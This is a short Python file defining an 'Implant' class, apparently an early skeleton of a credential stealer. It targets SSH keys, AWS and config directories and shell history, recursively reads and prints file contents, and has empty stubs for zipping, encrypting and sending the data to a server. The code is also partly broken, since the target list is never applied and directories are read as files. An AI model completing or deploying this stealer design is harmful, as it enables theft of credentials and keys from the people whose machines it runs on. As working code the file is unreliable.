from pathlib import Path
import zipfile

class Implant:
    
    # we scan from "source"
    # we look for file matching "target"
    def __init__(
        self, 
        source="/home/",
        target=["~/.ssh/", "~/.config/", "~/.aws/", "~/.history"],
        test=True
    ):
        if test:
            print("Implant initialize")
            print("source", source)
            print("target", target)

        self.root=Path(source)
        self.target=target
        self.file_path=[]
        self.zip_file=[]
        self.test=test
    
    # get list of file from source
    # matching target
    def walk_dir(self):

        for file_path in self.root.rglob("*"):
            self.file_path.append(file_path)
            if self.test: print(f"Found file: {file_path}")
            content=file_path.read_text()
            if self.test: print("Content:", content)
    
    # zip the files we found
    def zipfile(self):
        pass
    
    # encrypt the data
    def encrypt(self):
        pass

    # send to server
    def send_to_server(self):
        pass

def main():
    implant = Implant(source="test_data")
    implant.walk_dir()
    print(implant.file_path)

if __name__ == "__main__":
    main()



